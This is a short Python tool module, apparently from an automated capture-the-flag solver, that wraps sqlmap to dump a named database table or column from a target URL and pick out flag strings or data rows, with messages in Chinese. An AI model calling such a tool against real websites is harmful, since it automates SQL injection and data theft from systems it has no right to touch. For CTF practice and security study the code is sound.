import re
import subprocess
from config import SQLMAP_PATH
from tools.is_not_injectable import _is_not_injectable


def run_sqlmap_get_dump(url: str, database: str, table: str, column: str = None) -> str:
    if 'http' not in url.lower():
        return "URL格式错误"

    if column == "None" or column == "none":
        column = None

    cmd = [
        "python", SQLMAP_PATH,
        "-u", url,
        "-D", database,
        "-T", table,
        "--dump",
        "--batch",
        "--timeout", "10",
        "-v", "0"
    ]
    if column:
        cmd.extend(["-C", column])

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        if result.returncode != 0:
            return f"SQLMap 失败: {result.stderr.strip()[:500]}"
        output = result.stdout.strip()
        if not output or _is_not_injectable(output):
            return f"未检测到注入点，输出:\n{output[:500]}"

        # 优先提取 flag
        flag_match = re.search(r'(flag\{[^}]+\}|ctf\{[^}]+\})', output, re.IGNORECASE)
        if flag_match:
            return f"成功获取 flag: {flag_match.group(1)}"

        # 提取数据行，过滤 banner
        data_lines = []
        for line in output.split('\n'):
            if any(bad in line for bad in ['__H__', 'https://sqlmap.org', '___', 'V...', '[!]', '[*]', '[INFO]']):
                continue
            if '|' in line and not line.strip().startswith('+'):
                parts = [p.strip() for p in line.split('|') if p.strip()]
                if parts and not any(w in line for w in ['Column', 'Type']):
                    data_lines.append(' | '.join(parts))
        if data_lines:
            unique_data = []
            for line in data_lines:
                if not re.match(r'^[_\-\s]+$', line) and 'sqlmap' not in line.lower():
                    unique_data.append(line)
            if unique_data:
                preview = '\n'.join(unique_data[:10])
                return f"数据预览 (最多10行):\n{preview}"
        return f"未获取到有效数据。输出片段:\n{output[:800]}"
    except Exception as e:
        return f"错误: {str(e)}"